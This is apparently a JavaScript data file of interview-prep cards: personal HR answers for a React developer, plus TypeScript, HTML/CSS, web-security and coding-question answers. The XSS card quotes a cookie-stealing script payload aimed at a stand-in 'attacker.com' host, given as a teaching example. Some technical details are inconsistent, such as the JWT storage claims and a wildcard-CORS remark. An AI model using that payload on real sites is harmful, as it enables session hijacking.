    label: '🙋 Your Story',
    description: 'Personal answers — your experience, gap, background, projects (edit these to match your profile)',
    questions: [
      {
        level: 'HR',
        q: "Tell me about yourself. (Komal's personal answer)",
        structure: "Name + Role → Avua experience → what you built → now looking for",
        points: [
          { label: "Opening", text: "I am Komal Sharma, a React.js developer with 2.4 years of professional experience." },
          { label: "Background", text: "After completing my Bachelor's degree, I taught myself JavaScript and React from scratch — I believe software development is a craft built through practice, not just a degree." },
          { label: "At Avua", text: "I joined Avua International, an AI-driven hiring SaaS platform. I worked with full ownership on 8+ major product modules — including the onboarding flow, social login with Google and LinkedIn OAuth 2.0, candidate and recruiter dashboards, job listing page, job post flow, Avua Pool candidate search, vetting page, and Stripe and Razorpay payment integration." },
          { label: "Recent work", text: "After Avua, I independently built and deployed a full-stack MERN application — an Expense Tracker — with Node.js, Express, MongoDB, JWT authentication, and CI/CD through GitHub Actions. This expanded my backend skills significantly." },
          { label: "What I'm looking for", text: "I am now looking for a React.js or full-stack MERN role where I can take ownership of meaningful features, work with a product-focused team, and continue growing technically." }
        ]
      },
      {
        level: 'HR',
        q: "Why are you looking for a change? What about the gap since January?",
        structure: "Avua was great → intentional break → upskilled → stronger now → ready",
        points: [
          { label: "About Avua", text: "I had a genuinely great experience at Avua. I owned features end-to-end and built a product that real users depended on every day." },
          { label: "Why I left", text: "I left in January to take a short, deliberate break — to step back, reflect on the kind of role I wanted next, and upskill intentionally." },
          { label: "What I did during the gap", text: "I built and deployed a complete full-stack MERN application independently. I deepened my knowledge of React internals, system design, and JavaScript — and I built a personal career command center to track my job search." },
          { label: "The gap made me stronger", text: "The gap has actually made me technically stronger and more deliberate. I now have a clearer picture of what kind of team, product, and role I want to be in." },
          { label: "Key message", text: "I am ready to contribute immediately and excited about this opportunity. I never apologise for the gap — I used that time well." }
        ]
      },
      {
        level: 'HR',
        q: "You have a BA degree — not an engineering degree. Does that affect you?",
        structure: "Own it confidently → self-taught → real production experience → craft over degree",
        points: [
          { label: "Direct answer", text: "Honestly, it has not held me back at all." },
          { label: "Self-taught journey", text: "I taught myself JavaScript and React from scratch after my BA. There was no shortcut — I learned by building, breaking things, and fixing them." },
          { label: "Real-world proof", text: "I joined a production SaaS company, delivered 8+ major product modules, and built features that real users depended on every day. That experience is not theoretical — it is production code." },
          { label: "Philosophy", text: "I believe software development is a craft built through practice and problem-solving. Many strong developers I know came from non-traditional backgrounds. What matters is the quality of work — and I am proud of what I have built." },
          { label: "Close", text: "If anything, being self-taught has made me a better learner. I know how to figure things out on my own, which is exactly what production work demands." }
        ]
      },
      {
        level: 'STAR',
        q: "What was the most challenging feature you built? (CV Editor at Avua)",
        structure: "Situation → Problem (perf issue) → Your specific actions → Result",
        points: [
          { label: "Situation", text: "At Avua, I built the real-time CV editor — where every change a user makes must instantly appear in the live preview panel with no lag." },
          { label: "The Problem", text: "Every keystroke was triggering a full component tree re-render. With multiple sections, templates, font options, and drag-and-drop, this made the editor painfully slow for complex CVs." },
          { label: "My Diagnosis", text: "I used React DevTools Profiler and found that every single section was re-rendering on every keystroke — even sections the user hadn't touched yet." },
          { label: "Action 1 — React.memo", text: "I wrapped each individual section component in React.memo so only the section the user is currently editing re-renders. Unaffected sections stay frozen." },
          { label: "Action 2 — useMemo", text: "I used useMemo to memoize expensive formatting and template calculations that were running on every render but only depended on specific config values." },
          { label: "Action 3 — useCallback", text: "I used useCallback on all event handlers passed as props to child section components — this kept references stable so React.memo could actually do its job." },
          { label: "Result", text: "The editor went from choppy and unresponsive to buttery smooth. This experience gave me a deep, practical understanding of React's rendering behaviour and when memoization genuinely helps versus when it's premature." }
        ]
      },
      {
        level: 'STAR',
        q: "How did you implement OAuth 2.0? Walk me through the full flow.",
        structure: "Redirect → Auth code → Server-side exchange → JWT → Role-based",
        points: [
          { label: "Entry Point", text: "User clicks 'Login with Google' on the frontend. We redirect them to Google's OAuth endpoint with our client ID, the scopes we need — email, profile — and a pre-registered redirect URI." },
          { label: "User consents", text: "User authenticates with Google and grants permission. Google redirects back to our callback URL with a one-time authorization code." },
          { label: "Backend exchange", text: "Our Express backend receives this code and exchanges it with Google's token endpoint — sending our client ID, client secret, and the code — to receive an access token and the user's profile data." },
          { label: "Critical security point", text: "The client secret NEVER touches the frontend. The entire code exchange happens server-side. This is why we don't call Google's API directly from React — it would expose our secret." },
          { label: "User creation and JWT", text: "The backend finds or creates the user in MongoDB, then generates a JWT with the userId and role. The JWT is sent back to the frontend via a secure httpOnly cookie." },
          { label: "Role-based flows", text: "At Avua, candidates and recruiters had completely different onboarding, dashboards, and permissions. The role was embedded in the JWT and the frontend used it to render the correct interface and redirect to the right route." }
        ]
      },
      {
        level: 'STAR',
        q: "Walk me through the architecture of your Expense Tracker project.",
        structure: "Tech choices → Backend structure → Auth → Frontend → Deployment",
        points: [
          { label: "Why I built it", text: "After Avua focused exclusively on React, I wanted to prove full-stack capability independently. I designed, built, and deployed a complete MERN application from scratch." },
          { label: "Backend — Express API", text: "Node.js with Express. Layered architecture — routes call controllers, controllers call services, services handle business logic. Mongoose for MongoDB ODM. JWT-based authentication stored in httpOnly cookies." },
          { label: "Why MongoDB", text: "Expense records have variable structure — some have tags, some have receipts, some have categories. A flexible document model fits naturally, and the schema could evolve quickly without migration scripts." },
          { label: "Auth middleware", text: "I wrote a protect middleware that reads the JWT from the authorization header, verifies the signature, and attaches the decoded user to req.user. Every protected route passes through it." },
          { label: "Frontend — React", text: "React with Context API for global auth state. Axios for API calls. Private routes redirect unauthenticated users. Form validation with error handling." },
          { label: "Deployment + CI/CD", text: "Backend deployed on Render. Frontend on Vercel. GitHub Actions pipeline runs on every push to main — linting, then deploy. No manual deployment needed." }
        ]
      },
      {
        level: 'Situation-Based',
        q: "Tell me about a time you took ownership of a feature end-to-end.",
        structure: "Feature context → your full ownership → challenges → outcome",
        points: [
          { label: "Feature — Avua Pool", text: "Avua Pool is the recruiter's core candidate search feature. I was given just the requirements — no design, no architecture guidance. I owned it completely." },
          { label: "What I built", text: "A multi-filter search interface — candidates filterable by skills, experience, location, availability, and salary range. Dynamic filter state, debounced API calls to avoid hammering the backend, and result cards with lazy-loaded profile data." },
          { label: "Performance challenge", text: "With hundreds of filters and thousands of candidates, naive re-rendering was too slow. I applied useMemo for filtered results, useCallback for filter handlers, and React.memo on each CandidateCard." },
          { label: "Ownership", text: "I didn't just write the code — I thought through the user flow, handled empty states, loading states, and edge cases like zero results and network errors." },
          { label: "Outcome", text: "The feature launched and became one of the most-used parts of the recruiter dashboard. This is the kind of end-to-end ownership I bring to every feature." }
        ]
      },
      {
        level: 'Decision-Based',
        q: "Why did you choose Redux at Avua rather than Context API?",
        structure: "Multiple user types → frequent updates → selectors → DevTools",
        points: [
          { label: "The requirement", text: "At Avua, we had two user types — candidates and recruiters — with completely different state needs. Global state included user session, role, and shared job data that multiple pages needed simultaneously." },
          { label: "Why not Context API", text: "Context API would have re-rendered every consumer on any state change. With frequent updates — job fetching, filter changes, dashboard data — this would have caused cascading re-renders across the entire app." },
          { label: "Why Redux Toolkit", text: "RTK lets components subscribe to just the specific slice they need using useSelector. If only the job list updates, only the JobList component re-renders — not the entire tree." },
          { label: "DevTools advantage", text: "Redux DevTools let us trace every action, inspect state changes, and debug complex user flows. Invaluable for a platform as complex as Avua with role-based access and multi-step flows." },
          { label: "Rule I follow", text: "Context API for simple UI state like theme or language. Redux for complex domain state shared across many features, or when you need DevTools, middleware, or optimized selectors." }
        ]
      },
      {
        level: 'HR',
        q: "What is your expected salary?",
        structure: "Research-backed number → open to full package → growth matters too",
        points: [
          { label: "Target range", text: "Based on my 2.4 years of production React.js experience, full-stack MERN skills, and market research, I am targeting between 12 to 16 LPA." },
          { label: "Flexible", text: "However, I am open to discussing the full compensation package — the role, learning opportunity, team quality, and growth trajectory matter to me as much as the number." },
          { label: "Why I'm worth it", text: "I bring 8+ major production modules at Avua, full-stack capability, and the ability to take end-to-end ownership without constant hand-holding." }
        ]
      },
      {
        level: 'HR',
        q: "What are your biggest strength and weakness?",
        structure: "Strength — end-to-end ownership → Weakness — honest with growth",
        points: [
          { label: "Strength — Ownership", text: "I take full end-to-end ownership of everything I build. At Avua, I didn't just write UI code — I thought through the user flow, handled edge cases, optimised performance, and made architectural decisions independently." },
          { label: "Strength — Evidence", text: "I built 8+ major modules with no one handholding me. The Avua Pool feature, the OAuth integration, the payment flows — I owned all of those from design to deployment." },
          { label: "Weakness — Honest answer", text: "I sometimes spend too much time polishing code before shipping. I want things to be clean and performant, which occasionally slows me down." },
          { label: "How I'm fixing it", text: "I've been working on this by setting time-boxed goals — ship a working version first, then iterate and refine in the next pass. This has helped me move faster without sacrificing quality." }
        ]
      }
    ]
  },
  {
    id: 'typescript',
    label: '📘 TypeScript',
    description: 'Types, Interfaces, Generics, Utility types — honest answers',
    questions: [
      {
        level: 'Basic',
        q: "Why do we use TypeScript? What problem does it solve?",
        structure: "Static typing → catch errors at compile time → autocomplete → team docs",
        points: [
          { label: "Core purpose", text: "TypeScript adds static typing to JavaScript. The main benefit is catching errors at compile time — in your editor — rather than at runtime when the user sees a bug." },
          { label: "Concrete example", text: "If a function expects a string and I pass a number by mistake, TypeScript shows a red underline immediately in VS Code — before the code even runs. That is extremely valuable." },
          { label: "Developer experience", text: "TypeScript dramatically improves autocomplete and IntelliSense. When I type `user.`, I get a list of exactly which properties and methods are available — no guessing, no looking at the docs every time." },
          { label: "Team documentation", text: "In a team environment, types act as living documentation. Another developer can understand what a function expects and returns just by reading the type signatures — without needing comments." },
          { label: "Honest answer", text: "My TypeScript experience — I have used it for typing component props, useState, and API responses. I have not used it in a large-scale production codebase from day one, but I am actively learning and comfortable picking it up quickly on a real project." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is the difference between type and interface in TypeScript?",
        structure: "Both define shapes → interface merges, type is flexible → rule of thumb",
        points: [
          { label: "What they share", text: "Both type and interface define the shape of data — the properties and their types. For basic object shapes, they are largely interchangeable." },
          { label: "Interface — strengths", text: "Interface is specifically designed for object shapes. It supports declaration merging — if you declare the same interface name twice in different places, TypeScript automatically merges them into one. Useful for extending third-party library types." },
          { label: "Type — flexibility", text: "Type is more flexible. It can define object shapes, but also union types — `type ID = string | number` — intersection types, tuples, and mapped types. These are only possible with type, not interface." },
          { label: "Practical rule", text: "Use interface for React component props and complex object shapes — cleaner for OOP-style patterns. Use type for union types, utility type aliases, and situations where you need flexibility beyond simple objects." },
          { label: "In my usage", text: "At Avua, we typed all component props with interface — clean, readable, and easy to extend. For things like status enums — `type Status = 'pending' | 'approved' | 'rejected'` — we used type." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What are Generics in TypeScript? Give a real example.",
        structure: "Reusable typing → type parameter T → useState example → API fetcher",
        points: [
          { label: "What Generics solve", text: "Generics allow writing reusable, flexible code that works with different types — without losing type safety. Without generics, you'd need separate functions or types for each data shape." },
          { label: "Simple definition", text: "Instead of hardcoding a type, you use a type parameter — usually T — as a placeholder: `function identity<T>(arg: T): T { return arg }`. When you call it, TypeScript infers or you specify the actual type." },
          { label: "React example — useState", text: "`useState<User | null>(null)` — this tells TypeScript the state can be a User object or null. Now every access to the state value gets proper type checking and autocomplete." },
          { label: "API fetcher example", text: "`async function fetchData<T>(url: string): Promise<T>` — a single generic function that works for any endpoint. I call `fetchData<Job[]>('/api/jobs')` and TypeScript knows the response is an array of Job." },
          { label: "Why it matters", text: "Generics give you the flexibility of any without giving up type safety. They are the foundation of reusable utility functions and custom hooks with proper typing." }
        ]
      },
      {
        level: 'Advanced',
        q: "Explain Partial, Pick, Readonly, and Omit utility types.",
        structure: "Transform existing types → avoid repetition → real use cases",
        points: [
          { label: "Why utility types exist", text: "Utility types transform existing types without rewriting them. They prevent duplicating type definitions when you need slightly different shapes of the same data." },
          { label: "Partial<T>", text: "Makes ALL properties optional. Perfect for update functions where you only send the fields that changed: `function updateUser(changes: Partial<User>)` — no need to provide every field." },
          { label: "Pick<T, keys>", text: "Creates a new type with ONLY the selected properties from T: `Pick<User, 'name' | 'email'>` — gives you a type with only those two fields. Great for display components that only need a few fields from a large model." },
          { label: "Omit<T, keys>", text: "Opposite of Pick — creates a type WITHOUT the specified properties: `Omit<User, 'password'>` — useful for safely passing user data to the frontend without sensitive fields." },
          { label: "Readonly<T>", text: "Makes all properties immutable after creation. Useful for config objects or Redux state that should not be mutated directly." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is the difference between any, unknown, and never in TypeScript?",
        structure: "any = no checks → unknown = safe any → never = unreachable",
        points: [
          { label: "any", text: "`any` completely disables TypeScript's type checking for that value. You can do any operation on it and TypeScript won't complain. Avoid it — it defeats the entire purpose of using TypeScript." },
          { label: "unknown", text: "`unknown` is the safe alternative to `any`. You can assign any value to an `unknown` variable, but you MUST perform a type check before you can actually use it. This forces safe handling." },
          { label: "unknown example", text: "If `val` is `unknown`, you can't call `val.toLowerCase()` directly — TypeScript errors. You first check `if (typeof val === 'string')` and inside that block, TypeScript knows it's a string and allows string operations." },
          { label: "never", text: "`never` represents a value that literally never occurs. A function that always throws an error, or an infinite loop, has return type `never`. Useful in exhaustive type checks — if a switch case falls through to `default` and you want TypeScript to catch unhandled cases." },
          { label: "Rule of thumb", text: "Use `unknown` when you genuinely don't know the type — like parsing JSON from an API. Use `never` in exhaustiveness checks. Never use `any` in production code — it's a TypeScript defeat, not a solution." }
        ]
      }
    ]
  },
  {
    id: 'html_css',
    label: '🎨 HTML & CSS',
    description: 'Semantic HTML, Box Model, Flexbox, Grid, Specificity',
    questions: [
      {
        level: 'Basic',
        q: "What is semantic HTML? Why does it matter?",
        structure: "Meaningful elements → accessibility → SEO → maintainability",
        points: [
          { label: "Definition", text: "Semantic HTML uses elements that describe their MEANING — like `<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<footer>` — instead of wrapping everything in generic `<div>` tags." },
          { label: "Reason 1 — Accessibility", text: "Screen readers used by visually impaired users rely on semantic tags to navigate. A `<nav>` element tells a screen reader 'here is the navigation'. A `<div>` tells it nothing." },
          { label: "Reason 2 — SEO", text: "Search engines like Google parse semantic HTML to understand the structure and importance of content. An `<h1>` signals the main topic. An `<article>` signals self-contained content worth indexing." },
          { label: "Reason 3 — Maintainability", text: "Code with proper semantic HTML is dramatically easier to read and maintain. When you see `<main>` you instantly know what it is. `<div class='main-container'>` requires reading the CSS to understand." },
          { label: "My practice", text: "In all my work at Avua, I made sure to use semantic elements for page structure and only use `<div>` and `<span>` when no semantic element fits — for generic layout containers and inline styling." }
        ]
      },
      {
        level: 'Basic',
        q: "What is the CSS Box Model?",
        structure: "Content → Padding → Border → Margin → box-sizing difference",
        points: [
          { label: "Definition", text: "Every HTML element is a rectangular box. The CSS Box Model defines the four layers of that box from inside to outside." },
          { label: "The four layers", text: "Content — the actual text or image inside. Padding — space between content and border. Border — the line around the padding. Margin — space outside the border, separating this element from others." },
          { label: "box-sizing: content-box (default)", text: "This is the browser default. The width and height you set ONLY apply to the content area. Padding and border are ADDED on top, making the element larger than you specified — a common source of layout confusion." },
          { label: "box-sizing: border-box (recommended)", text: "Width and height include padding and border. If you set `width: 200px`, the total box is exactly 200px regardless of padding. This is almost always what you want. I add `*, *::before, *::after { box-sizing: border-box; }` to every project." },
          { label: "Margin collapsing", text: "A quirk worth knowing — vertical margins between block elements collapse. If one element has margin-bottom: 20px and the next has margin-top: 30px, the gap is 30px (the larger), not 50px (the sum)." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is the difference between Flexbox and CSS Grid?",
        structure: "1D vs 2D → use cases → when to pick each",
        points: [
          { label: "Flexbox — one dimensional", text: "Flexbox arranges items along a SINGLE axis — either a row or a column. It's excellent for distributing space among items in one direction and aligning them." },
          { label: "Flexbox best for", text: "Navigation bars, button groups, centering a single item, card rows, aligning icons with text — any layout that is fundamentally one-dimensional." },
          { label: "CSS Grid — two dimensional", text: "CSS Grid arranges items in ROWS AND COLUMNS simultaneously. You define the grid structure and place items into it." },
          { label: "Grid best for", text: "Full page layouts, dashboards, image galleries, any structure that has both row and column relationships. If you find yourself nesting multiple Flexbox containers just to create a layout, Grid is probably the right tool." },
          { label: "Rule I use", text: "Flexbox for component-level layouts — inside a card, inside a navbar. Grid for page-level layouts — the overall page structure, dashboard grids, multi-column content areas. They complement each other perfectly." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is the difference between position: relative, absolute, fixed, and sticky?",
        structure: "Document flow → reference point → scroll behavior",
        points: [
          { label: "relative", text: "Positions the element relative to its NORMAL position in the document flow. The element still takes up its original space — other elements don't shift. Primary use: to create a positioning context for absolutely positioned children." },
          { label: "absolute", text: "Removed from the normal document flow — other elements act as if it doesn't exist. Positioned relative to its NEAREST ancestor that has a position other than static. Without a positioned ancestor, it positions relative to the page." },
          { label: "fixed", text: "Positioned relative to the VIEWPORT — the browser window. It stays in the exact same position on screen even when the page scrolls. Perfect for sticky headers, floating action buttons, modal overlays." },
          { label: "sticky", text: "A hybrid of relative and fixed. Behaves like relative until the element hits a defined scroll threshold — like `top: 0` — then it sticks like fixed. Automatically releases when its parent container scrolls out of view. Perfect for table headers, section headings." },
          { label: "z-index", text: "Positioned elements (anything not static) can use z-index to control stacking order. Higher z-index = on top. z-index only works on positioned elements — that's a common gotcha." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is CSS specificity? How is it calculated?",
        structure: "Score system → 4 levels → !important override → practical tips",
        points: [
          { label: "What it is", text: "CSS specificity determines which CSS rule wins when multiple rules target the same element and set the same property. The rule with the highest specificity score applies." },
          { label: "The 4 levels (highest to lowest)", text: "1) Inline styles directly on the element — score 1000. 2) ID selectors (#header) — score 100 each. 3) Classes (.card), attributes ([type='text']), pseudo-classes (:hover) — score 10 each. 4) Element types (div, p) and pseudo-elements (::before) — score 1 each." },
          { label: "Example calculation", text: "`#nav .link:hover` — 1 ID (100) + 1 class (10) + 1 pseudo-class (10) = score 120. This beats `.link:hover` which is score 20, and will beat `li.link` which is 11." },
          { label: "!important", text: "`!important` overrides EVERYTHING including inline styles. It breaks the normal specificity cascade and makes CSS extremely hard to maintain and debug. Avoid it in your own code — only use it to override third-party styles you can't change." },
          { label: "Practical advice", text: "Keep specificity low and consistent. Prefer class selectors over ID selectors for styling. Avoid nesting too deeply. The specificity wars — adding more and more specific selectors to override each other — is a sign the CSS architecture needs refactoring." }
        ]
      }
    ]
  },
  {
    id: 'security',
    label: '🔐 Security',
    description: 'XSS, JWT, CORS — must-know for frontend developers',
    questions: [
      {
        level: 'Advanced',
        q: "What is XSS? How does React protect against it?",
        structure: "Attack definition → how it works → React's default protection → dangerous exceptions",
        points: [
          { label: "What is XSS", text: "Cross-Site Scripting — XSS — is when an attacker injects malicious JavaScript into a webpage that then executes in other users' browsers. It can steal cookies, session tokens, or any sensitive data the user has on that page." },
          { label: "How it happens", text: "Classic example: a comment form where a user submits `<script>document.location='attacker.com?c='+document.cookie</script>`. If the app renders this raw HTML, every visitor who loads the page executes that script." },
          { label: "React's automatic protection", text: "React automatically escapes ALL values rendered in JSX. Special characters like `<`, `>`, `&` are converted to HTML entities — `&lt;`, `&gt;`, `&amp;` — so they display as text, not executable code. This happens by default, no action needed." },
          { label: "The dangerous exception", text: "`dangerouslySetInnerHTML` — the name is a warning. It bypasses React's escaping entirely and injects raw HTML. Never use it with user-provided content. If you must use it — for rich text editors — sanitise the content first with DOMPurify." },
          { label: "Additional protection", text: "Never store tokens in localStorage — use httpOnly cookies instead. Set a Content Security Policy header on your server. Sanitise and validate all user input on both client and server." }
        ]
      },
      {
        level: 'Advanced',
        q: "Why should you NOT store JWT tokens in localStorage?",
        structure: "localStorage is JS-accessible → XSS attack vector → httpOnly cookie is safer",
        points: [
          { label: "The core problem", text: "localStorage is accessible via JavaScript — any script running on the page can do `localStorage.getItem('token')` and read it. This means your token is only as secure as every single script on your page." },
          { label: "The XSS attack path", text: "If your app has even a small XSS vulnerability, an attacker can inject a script that reads the JWT from localStorage and sends it to their server. Once they have the token, they can impersonate the user — session hijacking." },
          { label: "The safe alternative — httpOnly cookie", text: "An httpOnly cookie cannot be accessed by JavaScript at all — it is invisible to `document.cookie`. Only the browser can read and send it. Even if an attacker injects a script, they cannot steal the token." },
          { label: "Best practice pattern", text: "Short-lived access tokens — 15 minutes — stored in memory (React state). Long-lived refresh tokens — 7 days — stored in an httpOnly, Secure, SameSite cookie. When the access token expires, a silent call to `/api/auth/refresh` gets a new one." },
          { label: "I applied this at Avua", text: "We stored our JWT in an httpOnly cookie. The frontend never directly touched the token — the browser automatically sent it with every request. This is the pattern I used in my Expense Tracker project as well." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is CORS and how does it work?",
        structure: "Browser security mechanism → preflight request → server headers → not a server protection",
        points: [
          { label: "What CORS is", text: "CORS — Cross-Origin Resource Sharing — is a browser security mechanism that controls which origins (domains) are allowed to make requests to a server." },
          { label: "Why it exists", text: "By default, browsers block cross-origin requests. If your React app on `myapp.vercel.app` tries to fetch from `api.myapp.com`, the browser blocks it unless the server explicitly allows it. This prevents malicious websites from making API calls on behalf of logged-in users." },
          { label: "How it works — Preflight", text: "For complex requests — POST, PUT, DELETE, or requests with custom headers — the browser first sends an OPTIONS preflight request to check if the server allows it. The server responds with `Access-Control-Allow-Origin` and other headers." },
          { label: "Critical point — CORS is browser-only", text: "CORS is enforced by the browser, not the server. A server receives ALL requests regardless of origin — CORS only stops the browser from reading the response. curl and Postman have no CORS restrictions." },
          { label: "My implementation", text: "In my Expense Tracker, I configured Express CORS middleware to allow only my specific Vercel frontend domain — not a wildcard `*`. Wildcard is a security risk in production because it allows any website to make authenticated requests to your API if a user is logged in." }
        ]
      }
    ]
  },
  {
    id: 'dsa',
    label: '💡 DSA Coding',
    description: 'Arrays, Strings, Objects — Basic-Medium level for 2-4 YOE roles',
    questions: [
      {
        level: 'Basic',
        q: "What is Big O notation? Explain common complexities.",
        structure: "Performance scaling → O(1) → O(n) → O(n²) → O(log n)",
        points: [
          { label: "What it measures", text: "Big O notation describes how the performance of an algorithm scales as the input size grows. It tells you: if the input doubles, does the work stay constant, double, or quadruple?" },
          { label: "O(1) — Constant time", text: "Performance doesn't change no matter how large the input. Accessing an array element by index — `arr[5]` — is O(1) whether the array has 10 or 10 million items." },
          { label: "O(n) — Linear time", text: "Work grows proportionally with input size. A single for loop that processes each item once is O(n). If the array doubles, the work doubles." },
          { label: "O(n²) — Quadratic time", text: "Nested loops — O(n²). If the outer loop runs n times and the inner loop runs n times for each, total is n × n. Avoid for large inputs — 1000 items = 1,000,000 operations." },
          { label: "O(log n) — Logarithmic time", text: "Each step halves the problem. Binary search is O(log n). Even for 1 million items, it only takes about 20 steps. Extremely efficient." },
          { label: "Interviewer tip", text: "When asked about efficiency, count your loops. One loop = O(n). Nested loops = O(n²). Always mention: 'The brute force is O(n²) with nested loops, but I can do it in O(n) using a hash map.'" }
        ]
      },
      {
        level: 'Basic',
        q: "Reverse a string without using .reverse().",
        structure: "Loop from end → build result → time complexity O(n)",
        points: [
          { label: "Approach — loop from end", text: "Iterate from the last character to the first, building a new string: `for (let i = str.length - 1; i >= 0; i--) { result += str[i]; }`. Simple and clear." },
          { label: "One-liner approach", text: "Using spread and reduce: `[...str].reduce((acc, char) => char + acc, '')`. This spreads the string into an array of characters, then reduces it by prepending each character." },
          { label: "Time complexity", text: "Both approaches are O(n) — we visit each character exactly once." },
          { label: "Follow-up — what if interviewer asks about unicode?", text: "The spread operator `[...str]` correctly handles multi-byte unicode characters and emojis. Simple `str[i]` indexing can split them incorrectly. If the problem mentions unicode safety, use spread: `[...str].reverse().join('')`." }
        ]
      },
      {
        level: 'Basic',
        q: "Find all duplicate values in an array.",
        structure: "Hash map approach → O(n) vs brute force O(n²)",
        points: [
          { label: "Brute force (bad) — O(n²)", text: "Nested loops — for each element, check if it appears again. Works but is O(n²). Never mention this without immediately saying you can do better." },
          { label: "Better approach — Hash Map / Object — O(n)", text: "Create an empty object `seen = {}`. Loop through the array. If `seen[item]` exists, it's a duplicate — add to results. If not, set `seen[item] = true`. Single pass = O(n)." },
          { label: "Code", text: "`function findDuplicates(arr) { const seen = {}; const duplicates = []; for (let item of arr) { if (seen[item]) duplicates.push(item); else seen[item] = true; } return duplicates; }`" },
          { label: "Alternative — Set approach", text: "Use two Sets: one for seen items, one for duplicates. `const seen = new Set(); const dups = new Set(); for (const item of arr) { if (seen.has(item)) dups.add(item); else seen.add(item); } return [...dups];` — also O(n) and handles duplicates appearing 3+ times cleanly." },
          { label: "What to say to interviewer", text: "I'd use an object or Set for O(n) time complexity. The key insight is trading space (O(n) memory for the map) for time efficiency — a classic time-space tradeoff." }
        ]
      },
      {
        level: 'Intermediate',
        q: "Flatten a nested array to any depth.",
        structure: "Recursive approach → built-in flat(Infinity) → explain both",
        points: [
          { label: "Modern JS — built-in", text: "`arr.flat(Infinity)` — flattens to any depth. The argument specifies depth — `flat(1)` for one level, `flat(Infinity)` for all levels. Always mention the built-in first." },
          { label: "Recursive approach (interviewer usually wants this)", text: "Use `reduce` with recursion: check if each item is an array — if yes, recursively flatten it; if no, add it directly to accumulator." },
          { label: "Code", text: "`function flatten(arr) { return arr.reduce((acc, item) => { return Array.isArray(item) ? acc.concat(flatten(item)) : acc.concat(item); }, []); }`" },
          { label: "Time complexity", text: "O(n) where n is the TOTAL number of elements across all levels of nesting." },
          { label: "Why interviewers ask this", text: "It tests understanding of recursion, array methods like reduce, and the Array.isArray check. Even if you know the built-in, always show you can implement it from scratch." }
        ]
      },
      {
        level: 'Advanced',
        q: "Implement a debounce function from scratch.",
        structure: "Closure → timer → clearTimeout on each call → apply for this context",
        points: [
          { label: "Why interviewers love this", text: "Debounce tests closures, setTimeout, this context, and practical knowledge all in one. It also shows you understand real-world performance patterns." },
          { label: "How debounce works", text: "It delays function execution until a certain time has passed since the LAST call. Every new call resets the timer. If I am debouncing a search with 300ms delay, the API only fires 300ms after the user stops typing." },
          { label: "Implementation", text: "`function debounce(fn, delay) { let timer; return function(...args) { clearTimeout(timer); timer = setTimeout(() => { fn.apply(this, args); }, delay); }; }`" },
          { label: "Why clearTimeout", text: "Every time the returned function is called, it clears the PREVIOUS timer and starts a fresh one. This is the core mechanism — only the last call within the delay window actually executes." },
          { label: "Why fn.apply(this, args)", text: "We use `apply(this, args)` instead of just `fn(args)` to preserve the correct `this` context and pass all arguments through. Using an arrow function for the setTimeout callback also ensures `this` is inherited from the outer scope correctly." },
          { label: "Real usage", text: "At Avua, I debounced the candidate search input — without it, every keystroke hit the filter logic and the API. With a 300ms debounce, it only fires when the user pauses, saving significant compute on both ends." }
        ]
      },
      {
        level: 'Intermediate',
        q: "Two Sum — find two indices that add up to a target.",
        structure: "Brute force O(n²) → hash map O(n) → explain the complement trick",
        points: [
          { label: "Problem statement", text: "Given an array of numbers and a target, find the indices of two numbers that add up to the target. Example: `[2, 7, 11, 15]`, target `9` → output `[0, 1]` because 2 + 7 = 9." },
          { label: "Brute force — O(n²)", text: "Nested loop — for each element, check every other element. If they sum to target, return their indices. Works, but O(n²) — unacceptable for large inputs." },
          { label: "Optimal — Hash Map — O(n)", text: "As you loop through, for each number calculate `complement = target - current`. Check if the complement already exists in the map. If yes, return both indices. If no, store the current number with its index in the map." },
          { label: "Code", text: "`function twoSum(nums, target) { const map = {}; for (let i = 0; i < nums.length; i++) { const complement = target - nums[i]; if (map[complement] !== undefined) return [map[complement], i]; map[nums[i]] = i; } return []; }`" },
          { label: "How to explain to interviewer", text: "The key insight is that instead of searching the whole array for a complement — O(n) per element — we store seen values in a hash map for O(1) lookup. One pass, O(n) time, O(n) space." },
          { label: "The tricky var loop question (bonus)", text: "Classic trick: a for loop with `var i` and setTimeout logs `5 5 5 5 5` not `0 1 2 3 4`. Why? `var` is function-scoped — all callbacks share the same `i`, which is `5` by the time they run. Fix: use `let` (block-scoped, each iteration gets its own `i`) or an IIFE." }
        ]
      }
    ]
  }
];


